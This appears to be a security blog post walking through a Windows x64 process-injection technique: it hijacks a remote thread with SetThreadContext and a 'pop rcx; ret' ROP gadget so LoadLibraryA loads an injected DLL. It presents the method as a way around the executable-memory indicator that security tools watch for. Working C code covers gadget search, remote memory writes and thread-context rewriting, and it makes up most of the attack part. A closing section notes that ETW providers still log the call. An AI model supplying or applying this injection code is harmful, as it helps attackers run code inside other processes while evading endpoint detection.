# https://infosecwriteups.com/t-rop-h-thread-hijacking-without-executable-memory-allocation-d746c102a9ca

[Sitemap](https://infosecwriteups.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Ft-rop-h-thread-hijacking-without-executable-memory-allocation-d746c102a9ca&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Ft-rop-h-thread-hijacking-without-executable-memory-allocation-d746c102a9ca&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[**InfoSec Write-ups**](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-d746c102a9ca---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-d746c102a9ca---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: [https://weekly.infosecwriteups.com/](https://weekly.infosecwriteups.com/)

Follow publication

# T(ROP)H: Thread Hijacking with ROP

## How to use ROP to inject a DLL into a remote thread

[![Umarex](https://miro.medium.com/v2/resize:fill:64:64/1*k7u2oQRwb0KIQ5I74yRR1w.jpeg)](https://medium.com/@umarex01?source=post_page---byline--d746c102a9ca---------------------------------------)

[Umarex](https://medium.com/@umarex01?source=post_page---byline--d746c102a9ca---------------------------------------)

Follow

7 min read

·

Sep 17, 2024

14

1

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3Dd746c102a9ca&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Ft-rop-h-thread-hijacking-without-executable-memory-allocation-d746c102a9ca&source=---header_actions--d746c102a9ca---------------------post_audio_button------------------)

Share

## TL;DR

Allocating memory with **EXECUTE** privileges in the context of another process is a well-known IOC, as it suggests that some code may be preparing to execute in a space outside of the attacker’s original process.

Traditional thread hijacking involves writing shellcode into a memory area with execution privileges and then redirecting the **RIP** to execute it.

An alternative approach is to load a DLL, which avoids the need for executable memory allocation. However, this introduces a new challenge: passing the argument to LoadLibrary.

The **SetThreadContext** API does not allow overwriting of volatile registers such as **RCX**, which is required to pass the argument. This limitation can be circumvented by constructing a small ROP chain that allows the necessary register to be manipulated and the injected DLL to be successfully executed.

## CODE WALKTHROUGH

### 1\. Find Gadget

The first thing we need to do is find a suitable ROP gadget. In this case, we need to populate the RCX register because the [Windows x64 calling convention](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170) says that the first function argument is passed via RCX. We need to find a gadget that does a ‘pop rcx’ followed by a ‘ret’. This lets us transfer the full path of the DLL from the stack into the RCX register. Once we’ve done that, we can jump straight to the ‘LoadLibraryA’ function in ‘kernel32.dll’.

One good approach could be to start with a quick analysis of system libraries using tools like [ROPGadget](https://github.com/JonathanSalwan/ROPgadget). Once you’ve found a suitable gadget, the next step is to locate its address at runtime. You can do this using a function similar to the one shown below, which dynamically retrieves the address of the ‘pop rcx; ret’ gadget from ‘ntdll.dll’.

```
BOOL FindGadgetInFunction(const CHAR* moduleName, BYTE* gadget, SIZE_T gadgetSize, LPVOID* oFoundAddress)
{
 HMODULE hModule = GetModuleHandleA(moduleName);
 if (hModule == NULL)
  return FALSE;

 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
 PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
 PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

 BYTE* addressStart = (BYTE*)hModule;
 DWORD textSectionSize = pSectionHeader->Misc.VirtualSize;

 for (DWORD i = 0; i < textSectionSize - 3; i++) {
  if (memcmp(addressStart + i, gadget, gadgetSize) == 0) {
   *oFoundAddress = (LPVOID)(addressStart + i);
   FreeLibrary(hModule);
   return TRUE;
  }
 }

 FreeLibrary(hModule);
 return FALSE;
}
```

### 2\. Write the DLL path into the target process’s memory.

Next, you need to write the path of the DLL you want to inject into the target process’s memory. This is normally done using the standard method of allocating memory in the remote process with ‘VirtualAllocEx’, and then writing the full DLL path into this allocated space using ‘WriteProcessMemory’.

```
 // Allocate rw memory in the target process for the DLL path
 pRemoteDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 if (pRemoteDllPath == NULL) {
  printf("[-] Remote memory allocation failed\n");
  PrintLastError();
  goto Exit;
 }
 printf("[+] Remote memory allocated successfully: %p\n", pRemoteDllPath);

 // Write the DLL path into the allocated memory in the target process
 if (!WriteProcessMemory(hProcess, pRemoteDllPath, dllPath, strlen(dllPath) + 1, NULL)) {
  printf("[-] Failed to write to the target process memory\n");
  PrintLastError();
  VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
  goto Exit;
 }
 printf("[+] DLL path successfully written to the target process memory\n");
```

### 3\. Modify remote thread context

Now things are getting interesting. Once we’ve found the target remote thread, we can update the stack and registers we’ve got control of. This includes the instruction pointer (RIP) and the stack pointer (RSP).

## Get Umarex’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

Remember me for faster sign in

There are a few key steps to follow to get the ROP chain working and load the DLL into the target process:

- **Suspend the Thread:** First, we use the ‘SuspendThread’ API to suspend the target thread. This lets us safely modify its context without interfering with its ongoing execution.
- **Modify the RIP and RSP registers**: The RIP is updated to point to the address of our ROP gadget (the ‘pop rcx; ret’ sequence). The RSP is adjusted to allocate 32 bytes (4 DWORD64) on the stack.
- **Prepare and write the buffer to the stack**: The buffer contains the necessary values for the ROP chain execution:

1. At the top of the stack, we put the memory address that holds the path to the DLL we want to inject. When the gadget runs, the ‘pop rcx’ instruction will move this value from the stack into the RCX register.
2. Next, we put the address of the ‘LoadLibraryA’ function. After the ‘pop rcx’, the ‘ret’ instruction will pop this address into the RIP register, which will cause the thread to jump to LoadLibraryA and execute it with the path from RCX.
3. In the third position, we place the return address for the ‘LoadLibraryA’ function. For simplicity, this points to the ExitThread function, which ensures that the thread terminates cleanly once the DLL is loaded.

- **Resume the Thread**: thread can be now resumed using ‘ResumeThread’.

```
  // Suspend the thread to modify its context
 SuspendThread(hRemoteThread);
 GetThreadContext(hRemoteThread, &threadContext);

 // Prepare the buffer with the DLL path and function pointers.

 // RCX will hold the address of the DLL path in the target process.
 // This value will be passed to LoadLibraryA after the "pop rcx; ret" gadget is executed.
 *(DWORD64*)(buffer) = (DWORD64)pRemoteDllPath;

 // The next value in the buffer is the return address, which will be the address of LoadLibraryA.
 // After the "pop rcx; ret" gadget, the execution will jump to LoadLibraryA and use the
 // value in RCX (the DLL path) as its argument.
 *(DWORD64*)(buffer + 8) = (DWORD64)LoadLibraryA;

 // After LoadLibraryA finishes executing and the DLL is loaded, the thread should cleanly exit.
 // We ensure that the next value on the stack after the gadget execution is the address of ExitThread.
 *(DWORD64*)(buffer + 16) = (DWORD64)ExitThread;

 // Adjust the stack pointer (RSP). The decrement of 32 bytes ensures that the stack
 // is properly aligned and avoids overwriting any important data.
 threadContext.Rsp -= 32;

 // Set the instruction pointer (RIP) to the gadget "pop rcx; ret".
 threadContext.Rip = (DWORD64)pPopRcxRetGadgetAddr;

 // Write the modified context (buffer) to the target thread's stack
 if (!WriteProcessMemory(hProcess, (PVOID)(threadContext.Rsp), buffer, 24, NULL)) {
  printf("[-] Failed to write to the target thread's stack\n");
  PrintLastError();
  VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
  goto Exit;
 }
 printf("[+] Successfully wrote to the target thread's stack\n");

 // Overwrite the target thread's context with the new values
 if (!SetThreadContext(hRemoteThread, &threadContext)) {
  printf("[-] Failed to set the target thread's context\n");
  VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
  goto Exit;
 }
 printf("[+] Thread context successfully overwritten\n");

 // Wait before resuming the thread to ensure the context has been modified
 Sleep(2000);

 // Resume the hijacked thread
 ResumeThread(hRemoteThread);
 printf("[+] Remote thread successfully hijacked\n");
```

## EXECUTION

The first image shows what the thread looked like before we made any changes to the context. At this point, the thread is paused and its registers and stack are left untouched. The instruction pointer (RIP) is pointing to where the code was originally executed, and the stack pointer (RSP) is managing the current call stack.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*mbyKwqoz65Y1_Kkw9ueCfQ.png)

The second image shows what happens to the thread after the context has been modified. At this point, the instruction pointer (RIP) has been updated to point to our ROP gadget (pop rcx; ret), and the stack pointer (RSP) has been adjusted to allocate space for the prepared buffer. The buffer has been written to the stack, along with the DLL path address, the address of the ‘LoadLibraryA’ function, and the return address pointing to ‘ExitThread’.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*_kdXrdQSCmA7MvtLxsaKBQ.png)

And this is what we got!

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*MpUDdJn9a02AlLOWjNzUIQ.png)

We can also check if the DLL injection worked by looking at the results in Process Monitor (ProcMon).

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*1Wb9h4R0CD_CnjotwD5O6A.png)

## DETECTABILITY

Although this technique avoids allocating executable memory, it can still be easily detected by EDR because it relies on the well-known ‘SetThreadContext’ API.

As well explained in [David Wells’ post](https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d), the API notifies two differents ETW providers during its execution:

> This step notifies that the _SetThreadContext_ call occurred so that consumers of this provider may be notified. We actually see two different ETW writes occur here, each for different providers:
>
> **Microsoft-Windows-Kernel-Audit-API-Calls**
>
> **Microsoft-Windows-Threat-Intelligence**
>
> From this, it’s clear that _SetThreadContext_ event logging is not just for diagnostic/audit consumers, but also for security consumers. From the little I found online, it appeared some Microsoft security tools, such as Windows Defender APT, consume such Threat-Intel events for EDR purposes, and it makes sense being that _SetThreadContext_ can have malicious usages that should be monitored for.

## CONCLUSIONS

We’ve seen how to get around the usual memory allocation IOC and API limits by using ROP chains to perform a DLL injection in a Windows x64 environment. By tweaking the thread’s context we were able to run a controlled ROP chain to load a DLL without allocating executable memory

[Windows](https://medium.com/tag/windows?source=post_page-----d746c102a9ca---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----d746c102a9ca---------------------------------------)

[Process Injection](https://medium.com/tag/process-injection?source=post_page-----d746c102a9ca---------------------------------------)

[Hijacking](https://medium.com/tag/hijacking?source=post_page-----d746c102a9ca---------------------------------------)

[Programming](https://medium.com/tag/programming?source=post_page-----d746c102a9ca---------------------------------------)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--d746c102a9ca---------------------------------------)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--d746c102a9ca---------------------------------------)

Follow

[**Published in InfoSec Write-ups**](https://infosecwriteups.com/?source=post_page---post_publication_info--d746c102a9ca---------------------------------------)

[85K followers](https://infosecwriteups.com/followers?source=post_page---post_publication_info--d746c102a9ca---------------------------------------)

· [Last published 7 hours ago](https://infosecwriteups.com/flag-mastery-the-flags-that-run-every-engagement-5468d7a2b6ce?source=post_page---post_publication_info--d746c102a9ca---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: [https://weekly.infosecwriteups.com/](https://weekly.infosecwriteups.com/)

Follow

[![Umarex](https://miro.medium.com/v2/resize:fill:96:96/1*k7u2oQRwb0KIQ5I74yRR1w.jpeg)](https://medium.com/@umarex01?source=post_page---post_author_info--d746c102a9ca---------------------------------------)

[![Umarex](https://miro.medium.com/v2/resize:fill:128:128/1*k7u2oQRwb0KIQ5I74yRR1w.jpeg)](https://medium.com/@umarex01?source=post_page---post_author_info--d746c102a9ca---------------------------------------)

Follow

[**Written by Umarex**](https://medium.com/@umarex01?source=post_page---post_author_info--d746c102a9ca---------------------------------------)

[30 followers](https://medium.com/@umarex01/followers?source=post_page---post_author_info--d746c102a9ca---------------------------------------)

· [8 following](https://medium.com/@umarex01/following?source=post_page---post_author_info--d746c102a9ca---------------------------------------)

Independent security researcher

Follow

## Responses (1)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

Write a response

[What are your thoughts?](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Ft-rop-h-thread-hijacking-without-executable-memory-allocation-d746c102a9ca&source=---post_responses--d746c102a9ca---------------------respond_sidebar------------------)

Cancel

Respond

See all responses

[Help](https://help.medium.com/hc/en-us?source=post_page-----d746c102a9ca---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----d746c102a9ca---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----d746c102a9ca---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----d746c102a9ca---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----d746c102a9ca---------------------------------------)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----d746c102a9ca---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----d746c102a9ca---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----d746c102a9ca---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----d746c102a9ca---------------------------------------)

reCAPTCHA

Recaptcha requires verification.

protected by **reCAPTCHA**